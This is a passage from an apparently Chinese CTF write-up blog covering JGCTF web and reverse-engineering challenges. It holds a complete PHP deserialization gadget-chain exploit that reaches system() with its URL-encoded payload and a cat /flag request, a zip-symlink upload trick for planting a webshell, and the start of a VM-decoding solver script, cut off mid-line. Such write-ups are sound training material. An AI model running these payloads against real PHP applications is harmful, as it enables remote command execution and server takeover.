class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ApplicationContext</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$contextName</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123; <span class="variable language_">$this</span>-&gt;contextName = <span class="string">&#x27;ApplicationContext&#x27;</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123; <span class="variable language_">$this</span>-&gt;contextName = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;contextName); &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ContentProcessor</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$processedContent</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$callbackFunction</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123; <span class="variable language_">$this</span>-&gt;processedContent = <span class="keyword">new</span> <span class="title class_">FunctionInvoker</span>(); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">property_exists</span>(<span class="variable">$this</span>, <span class="variable">$key</span>)) &#123;</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$this</span>-&gt;<span class="variable">$key</span>) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;callbackFunction)) &#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 调用系统函数，执行 $_POST[&#x27;cmd&#x27;]</span></span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;callbackFunction&#125;(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">      &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileManager</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$targetFile</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$responseData</span> = <span class="string">&#x27;default_response&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$targetFile</span> = <span class="literal">null</span></span>)</span>&#123; <span class="variable language_">$this</span>-&gt;targetFile = <span class="variable">$targetFile</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filterPath</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/|php:|data|zip|\.\.\//i&#x27;</span>,<span class="variable">$this</span>-&gt;targetFile))&#123;</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;路径不合法&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">performWriteOperation</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$targetObject</span> = <span class="variable language_">$this</span>-&gt;targetFile;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$value</span> = <span class="variable">$targetObject</span>-&gt;<span class="variable">$var</span>; <span class="comment">// 触发 __get()</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFileHash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filterPath</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;targetFile)) &#123;</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;targetFile)) <span class="keyword">return</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$this</span>-&gt;targetFile);</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&quot;文件未找到&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$this</span>-&gt;targetFile)) &#123;</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">try</span> &#123; <span class="keyword">return</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$this</span>-&gt;targetFile); &#125;</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">catch</span> (<span class="built_in">TypeError</span> <span class="variable">$e</span>) &#123; <span class="keyword">return</span> <span class="string">&quot;TypeError&quot;</span>; &#125;</span><br><span class="line">    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="keyword">die</span>(<span class="string">&quot;文件未找到&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>])) &#123;</span><br><span class="line">    </span><br><span class="line">      <span class="variable">$method</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">      <span class="variable">$var</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;var&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;var&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="variable">$method</span>(<span class="variable">$var</span>);</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;responseData;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FunctionInvoker</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">    </span><br><span class="line">      <span class="variable">$name</span>(<span class="variable">$arg</span>[<span class="number">0</span>]); <span class="comment">// 调用 system/passthru 等</span></span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ================== 构造链条 ================== */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 最内层：ContentProcessor</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$C</span> = <span class="keyword">new</span> <span class="title class_">ContentProcessor</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$C</span>-&gt;callbackFunction = <span class="string">&#x27;system&#x27;</span>; <span class="comment">// 也可换成 passthru/exec/shell_exec</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 中间层：FileManager</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$B</span> = <span class="keyword">new</span> <span class="title class_">FileManager</span>(<span class="variable">$C</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$B</span>-&gt;responseData = <span class="string">&#x27;READY&#x27;</span>; <span class="comment">// 避免 &quot;default_response&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 外层：FileManager</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$A</span> = <span class="keyword">new</span> <span class="title class_">FileManager</span>(<span class="variable">$B</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成序列化 payload</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$A</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Raw:\n<span class="subst">$payload</span>\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;URL-encoded:\n&quot;</span> . <span class="title function_ invoke__">urlencode</span>(<span class="variable">$payload</span>) . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>运行生成payload</p>
<p><img src="/2025/08/23/JGCTF-8-WP/image6.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A11%3A%22FileManager%22%3A2%3A%7Bs%3A10%3A%22targetFile%22%3BO%3A11%3A%22FileManager%22%3A2%3A%7Bs%3A10%3A%22targetFile%22%3BO%3A16%3A%22ContentProcessor%22%3A2%3A%7Bs%3A34%3A%22%00ContentProcessor%00processedContent%22%3BO%3A15%3A%22FunctionInvoker%22%3A0%3A%7B%7Ds%3A16%3A%22callbackFunction%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A12%3A%22responseData%22%3Bs%3A5%3A%22READY%22%3B%7Ds%3A12%3A%22responseData%22%3Bs%3A16%3A%22default_response%22%3B%7D</span><br></pre></td></tr></table></figure>

<p>然后加上参数</p>
<p>最终payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_to_check=O%3A11%3A%22FileManager%22%3A2%3A%7Bs%3A10%3A%22targetFile%22%3BO%3A11%3A%22FileManager%22%3A2%3A%7Bs%3A10%3A%22targetFile%22%3BO%3A16%3A%22ContentProcessor%22%3A2%3A%7Bs%3A34%3A%22%00ContentProcessor%00processedContent%22%3BO%3A15%3A%22FunctionInvoker%22%3A0%3A%7B%7Ds%3A16%3A%22callbackFunction%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A12%3A%22responseData%22%3Bs%3A5%3A%22READY%22%3B%7Ds%3A12%3A%22responseData%22%3Bs%3A16%3A%22default_response%22%3B%7D&amp;submit_md5=&amp;method=performWriteOperation&amp;var=processedContent&amp;cmd=cat /flag</span><br></pre></td></tr></table></figure>



<p><img src="/2025/08/23/JGCTF-8-WP/image7.png"></p>
<h2 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez_upload"></a>ez_upload</h2><p>打开环境就一个文件上传</p>
<p>没回显，没有任何思路</p>
<p>于是尝试去搜索</p>
<p>找到相关文章</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gxngxngxn/p/17439035.html">https://www.cnblogs.com/gxngxngxn/p/17439035.html</a></p>
<p>于是进行构造软连接</p>
<p>那么方向就很明显了，我们可以先上传一个带有软连接的压缩包，这个软连接指向网站的根目录，即&#x2F;var&#x2F;www&#x2F;html,然后我们再上传一个带有马的文件的压缩包，就可以将这个带马文件压缩到网站的根目录下，我们也可以直接访问这个带马文件了</p>
<p><img src="/2025/08/23/JGCTF-8-WP/image8.png"></p>
<p>然后删除link（防止与文件夹重名）这个文件，创建一个名为link的文件夹，然后在这个文件夹下写入带马的Php文件(因为之前我们软连接的文件叫做link，所以我们要让这个压缩在这个文件夹下面):</p>
<p><img src="/2025/08/23/JGCTF-8-WP/image9.png"></p>
<p>那么现在完事具备了，只欠上传捏</p>
<p>先上传link.zip,然后再上传link1.zip</p>
<p>然后去访问&#x2F;shell.php</p>
<p><img src="/2025/08/23/JGCTF-8-WP/image10.png"></p>
<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="Checkit"><a href="#Checkit" class="headerlink" title="Checkit"></a>Checkit</h2><p>下载附件</p>
<p><img src="/2025/08/23/JGCTF-8-WP/image11.png"></p>
<p>去ida调试so层找check方法</p>
<p>Java_com_test_ezre_MainActivity_checkInput	</p>
<p><img src="/2025/08/23/JGCTF-8-WP/image12.png"></p>
<p>拿到code的值</p>
<p><img src="/2025/08/23/JGCTF-8-WP/image13.png"></p>
<p>去掉多余的空字节</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code = [0x34,0x2E,0x2B,0x2E,0x19,0x2C,0x29,0x2D,0x2E,0x4E,0x22,0x27,0x2E,0x53,0x2D,0x28,0x23,0x2D,0x2E,0x53,0x26,0x27,0x2F,0x31,0x2B,0x2E,0x43,0x2D,0x29,0x26,0x2D,0x2E,0x54,0x22,0x27,0x2E,0x46,0x2D,0x28,0x23,0x27,0x2F,0x31,0x2B,0x32,0x26,0x2E,0x31,0x2B,0x2E,0x32,0x2C,0x30,0x2D,0x28,0x33,0x32,0x04,0xFF]</span><br></pre></td></tr></table></figure>

<p>继续追看exec具体怎么实现的</p>
<p><img src="/2025/08/23/JGCTF-8-WP/image14.png"></p>
<p>头大</p>
<p>丢ai分析</p>
<p>VM 指令流</p>
<p>继续拿</p>
<p><img src="/2025/08/23/JGCTF-8-WP/image15.png"></p>
<p><img src="/2025/08/23/JGCTF-8-WP/image16.png"></p>
<p>给ai写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">自动从 VM 中恢复 flag 的完整解密脚本</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">保存为 solve_vm.py 后运行： python3 solve_vm.py</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span 